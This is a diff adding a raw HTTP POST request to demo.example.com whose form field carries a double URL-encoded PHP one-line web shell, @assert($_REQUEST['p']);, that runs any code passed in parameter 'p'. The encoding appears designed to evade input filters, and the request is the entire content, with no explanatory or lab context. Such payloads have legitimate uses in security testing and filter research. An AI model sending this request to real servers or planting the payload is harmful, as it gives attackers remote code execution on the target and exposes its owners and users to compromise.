@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 65
+Connection: close
+
+file=%2540assert%2528%2524_REQUEST%255B%2527p%2527%255D%2529%253B
